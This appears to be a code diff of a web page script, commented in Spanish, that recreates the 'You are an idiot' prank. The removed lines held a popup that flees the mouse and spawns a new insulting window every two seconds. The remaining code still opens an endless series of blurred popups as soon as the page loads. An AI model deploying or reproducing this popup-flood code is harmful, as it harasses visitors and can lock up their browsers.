@@ -31,55 +31,13 @@
   
   <script>
     function abrirVentana() {
-      const videoSource = 'tu_video.mp4';
-      const nuevaVentana = window.open('', '_blank', 'width=400,height=300');
-
+      const nuevaVentana = window.open('popup.html', '_blank', 'width=400,height=300');
       if (nuevaVentana) {
-        nuevaVentana.document.write(`
-          <html>
-            <head>
-              <title>You are an idiot</title>
-              <style>
-                body { margin: 0; background-color: black; display: flex; align-items: center; justify-content: center; }
-                video { width: 100%; height: 100%; outline: none; }
-              </style>
-            </head>
-            <body>
-              <video autoplay loop muted>
-                <source src="${videoSource}" type="video/mp4">
-                Tu navegador no soporta la reproducción de video.
-              </video>
-              <script>
-                // Función para hacer que la ventana "huya" del ratón
-                document.addEventListener('mousemove', (event) => {
-                  const distancia = 100;
-                  const ventanaX = window.screenX + window.outerWidth / 2;
-                  const ventanaY = window.screenY + window.outerHeight / 2;
-
-                  if (Math.abs(event.screenX - ventanaX) < distancia && Math.abs(event.screenY - ventanaY) < distancia) {
-                    const nuevaX = Math.floor(Math.random() * (window.screen.availWidth - window.outerWidth));
-                    const nuevaY = Math.floor(Math.random() * (window.screen.availHeight - window.outerHeight));
-                    window.moveTo(nuevaX, nuevaY);
-                  }
-                });
-
-                // Configuración para abrir más ventanas
-                setInterval(() => {
-                  const win = window.open('', '_blank', 'width=400,height=300');
-                  if (win) {
-                    win.document.write('<p style="color: yellow; font-size: 20px; background: black; text-align: center;">You are an idiot!</p>');
-                    win.blur();
-                  }
-                }, 2000);
-              <\/script>
-            </body>
-          </html>
-        `);
-        nuevaVentana.document.close();
+        nuevaVentana.blur();
       }
     }
 
-    // Llamada inicial para abrir una ventana y desencadenar el proceso
+    // Comienza el ciclo de apertura de ventanas
     setInterval(abrirVentana, 2000);
   </script>
 </body>
